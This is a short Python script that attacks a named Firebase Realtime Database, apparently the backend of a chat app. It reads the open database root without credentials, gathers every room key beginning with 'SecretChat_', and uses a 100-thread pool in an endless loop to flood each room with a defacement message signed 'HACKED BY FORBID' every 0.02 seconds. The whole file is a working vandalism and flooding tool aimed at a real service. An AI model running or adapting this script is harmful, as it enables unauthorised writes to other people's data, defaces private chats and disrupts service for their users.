import time
import requests
from concurrent.futures import ThreadPoolExecutor

database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] Max-Speed Broadcaster Engaged...")

session = requests.Session()

def blast_room(room_url):
    try:
        # Clean, direct payload designed to render instantly without breaking layout
        payload = {
            "Sender": "FORBID",
            "Message": "HACKED BY FORBID | DISCORD: forbiddenway",
            "Timestamp": int(time.time() * 1000),
            "Aura": "voidWings",
            "Color": "red"
        }
        session.post(room_url, json=payload, headers=headers, timeout=1)
    except Exception:
        pass

while True:
    try:
        root_response = session.get(f"{database_url}/.json", timeout=3)
        
        if root_response.status_code == 200:
            data = root_response.json()
            if isinstance(data, dict):
                room_urls = [
                    f"{database_url}/{key}.json" 
                    for key in data.keys() 
                    if key.startswith("SecretChat_")
                ]
                
                if room_urls:
                    # Maximized worker pool to hammer every room simultaneously
                    with ThreadPoolExecutor(max_workers=100) as executor:
                        executor.map(blast_room, room_urls)
                    print(f"[FORBID] Spam wave delivered to {len(room_urls)} active servers!")
                    
    except Exception as e:
        print(f"[FORBID] Loop error: {e}")
        
    # Instant re-fire
    time.sleep(0.02)
